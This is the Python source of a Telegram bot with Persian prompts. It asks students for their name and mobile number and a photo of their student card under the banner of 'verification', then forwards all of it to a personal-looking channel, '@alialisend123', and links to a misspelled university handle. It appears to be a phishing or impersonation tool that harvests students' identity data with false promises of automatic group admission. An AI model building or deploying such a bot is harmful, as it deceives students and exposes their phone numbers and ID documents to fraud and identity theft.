from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, CallbackQueryHandler
import logging
import re

# ======= تنظیمات =======
TOKEN = "توکن_ربات"
CHANNEL_ID = "@alialisend123"   # یا آیدی عددی کانال
REGISTER_LINK = "https://t.me/azadunivercitybrj"
# ========================

logging.basicConfig(level=logging.INFO)

# تبدیل اعداد فارسی به انگلیسی
def normalize_digits(text):
    persian_digits = "۰۱۲۳۴۵۶۷۸۹"
    english_digits = "0123456789"
    trans_table = str.maketrans(persian_digits, english_digits)
    return text.translate(trans_table)

def start(update: Update, context: CallbackContext):
    update.message.reply_text("🎉 سلام! خوش آمدید 🌟\nلطفاً نام و نام خانوادگی خود را ارسال کنید:")

def handle_text(update: Update, context: CallbackContext):
    user_data = context.user_data
    text = update.message.text.strip()

    # مرحله نام (بدون محدودیت)
    if "name" not in user_data:
        user_data["name"] = text

        keyboard = [[InlineKeyboardButton("🚀 شروع اعتبارسنجی", callback_data="start_verification")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        update.message.reply_text(
            f"👋 خوش آمدید {text}!\n\n"
            "📌 برای امنیت و تکمیل لیست دانشجویان، لازم است شماره موبایل و کارت دانشجویی شما تأیید شود.\n"
            "برای شروع دکمه زیر را بزنید 👇",
            reply_markup=reply_markup
        )
        return

    # مرحله شماره موبایل
    if "waiting_for_phone" in user_data and "phone" not in user_data:
        phone = normalize_digits(text)
        if not re.fullmatch(r"09\d{9}", phone):
            update.message.reply_text("❌ شماره موبایل معتبر نیست! باید 11 رقمی و با 09 شروع شود.")
            return
        user_data["phone"] = phone
        update.message.reply_text("📸 لطفاً عکس دانشجویی یا انتخاب واحد خود را ارسال کنید:")
        return

    update.message.reply_text("❗ لطفاً طبق مراحل پیش بروید.")

def handle_photo(update: Update, context: CallbackContext):
    user_data = context.user_data
    if "name" not in user_data or "phone" not in user_data:
        update.message.reply_text("❌ لطفاً ابتدا نام و شماره موبایل خود را وارد کنید.")
        return

    photo_file = update.message.photo[-1].get_file()
    caption = f"👤 نام: {user_data.get('name')}\n📱 شماره: {user_data.get('phone')}"
    photo_file.download("temp.jpg")

    # ارسال به کانال
    context.bot.send_photo(chat_id=CHANNEL_ID, photo=open("temp.jpg", "rb"), caption=caption)

    keyboard = [[InlineKeyboardButton("✅ ثبت نهایی", url=REGISTER_LINK)]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    update.message.reply_text(
        "✅ اطلاعات شما ثبت شد!\nبرای تکمیل ثبت‌نام روی دکمه زیر کلیک کنید 👇",
        reply_markup=reply_markup
    )

    update.message.reply_text(
        "🎓 تیم فنی پس از بررسی اطلاعات شما، به صورت خودکار شما را وارد گروه خواهند کرد. 🌟"
    )

    user_data.clear()

def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_data = context.user_data

    if query.data == "start_verification":
        user_data["waiting_for_phone"] = True
        query.message.reply_text("📱 لطفاً شماره موبایل خود را وارد کنید:")

def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_text))
    dp.add_handler(MessageHandler(Filters.photo, handle_photo))
    dp.add_handler(CallbackQueryHandler(button_handler))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
